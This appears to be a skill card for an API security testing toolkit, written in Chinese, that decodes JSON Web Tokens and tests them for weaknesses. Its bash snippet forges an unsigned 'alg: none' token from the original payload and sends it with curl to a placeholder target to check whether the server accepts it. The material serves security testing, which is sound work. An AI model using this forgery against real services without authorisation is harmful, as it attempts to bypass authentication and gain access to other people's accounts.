---
name: jwt-analyzer
category: API 安全
description: JWT 解码与漏洞测试
when_to_use: 响应/请求中出现 JWT
---
**配方**: `api-security/jwt.md`

```bash
T='<jwt>'; H=$(echo "$T"|cut -d. -f1); P=$(echo "$T"|cut -d. -f2)
b64d(){ echo "$1" | tr '_-' '/+' | awk '{l=length($0)%4; if(l==2)print $0"=="; else if(l==3)print $0"="; else print $0}' | base64 -d 2>/dev/null; }
b64d "$H"; b64d "$P"                    # 看 alg / exp
NH=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
curl -sSk -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $NH.$P." '<target>'
```
